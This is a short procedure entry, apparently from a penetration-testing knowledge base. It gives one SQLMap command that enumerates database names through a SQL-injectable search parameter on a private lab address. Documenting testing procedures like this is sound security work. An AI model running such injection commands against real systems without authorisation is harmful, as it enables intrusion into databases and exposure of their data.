---
id: d174829e-4ff7-49cd-b7f3-3c26071347cf
name: Using SQLMap to Reveal Database Names
type: procedure
verified: true
submitted: true
created_at: '2020-08-19T17:15:14.214665+00:00'
updated_at: '2023-05-26T15:59:24.087020+00:00'
platforms:
- Web
tags:
- '[[owasp]]'
- '[[owasp top 10]]'
- '[[sqli]]'
- '[[SQL Injection]]'
- '[[Web Applications]]'
commands:
- '[[SQLMap Command to Reveal Database Names]]'
---

# Using SQLMap to Reveal Database Names

**Status**: ✓ Verified

## Summary

SQLMap is an automated SQL Injection exploitation tool. This can be used to insert the SQL injection payloads through the application input fields. 

## Description

# Description

SQLMap is an automated SQL Injection exploitation tool. This can be used to insert the SQL injection payloads through the application input fields.

# Procedure

1. Use the following SQLMap command to obtain the list of database names.

**Command** ([[SQLMap Command to Reveal Database Names]]):

```bash
sqlmap -u 'http://192.168.43.68/vcart/search.php?term=' --dbs
```

## Platforms

- Web

## Commands Used

- [[SQLMap Command to Reveal Database Names]]

## Tags

- [[owasp]]
- [[owasp top 10]]
- [[sqli]]
- [[SQL Injection]]
- [[Web Applications]]
